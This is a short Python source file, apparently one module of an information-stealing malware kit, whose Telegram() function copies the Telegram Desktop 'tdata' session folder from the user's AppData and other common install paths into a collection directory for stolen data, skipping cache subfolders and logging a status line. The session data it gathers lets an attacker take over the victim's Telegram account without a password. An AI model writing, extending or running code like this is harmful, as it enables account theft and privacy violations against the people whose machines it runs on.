from os import environ
from shutil import copytree,ignore_patterns
from manager.logger import Log
from preferences.config import config

def Telegram():
    msgInfo = ""
    roaming = environ["APPDATA"]
    pathToLogs = f'{config.pathToLogs}\\Messengers\\Telegram'
    dirs=[
        roaming+"\\Telegram Desktop\\tdata",
        'D:\\Telegram Desktop\\tdata',
        'C:\\Program Files\\Telegram Desktop\\tdata'
    ]
    try:
        for dir in dirs:
            copytree(dir,pathToLogs,ignore = ignore_patterns("dumps", "emoji", "tdummy", "user_data", "user_data#2", "user_data#3"))
    except Exception as e:
        Log(f"Telegram {dir} ---> {e}")
    msgInfo+="\n∟📨Telegram"
    return msgInfo